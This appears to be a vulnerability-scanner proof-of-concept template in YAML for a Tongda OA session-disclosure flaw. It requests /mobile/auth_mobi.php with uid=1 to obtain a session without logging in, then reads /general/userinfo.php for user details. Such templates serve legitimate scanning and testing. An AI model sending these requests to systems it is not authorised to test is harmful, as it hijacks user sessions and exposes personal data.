detail:
  author: kzaopa(https://github.com/kzaopa)
  links:
  - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
expression: r0() && r1()
manual: true
name: poc-yaml-tongda-user-session-disclosure
rules:
  r0:
    expression: 'true'
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
  r1:
    expression: response.status == 200 && response.body.bcontains(b"\"dept_name\":\"")
      && response.body.bcontains(b"\"online_flag\":") && response.headers["Content-Type"].contains("application/json")
    request:
      cache: true
      follow_redirects: false
      method: POST
      path: /general/userinfo.php?UID=1
transport: http
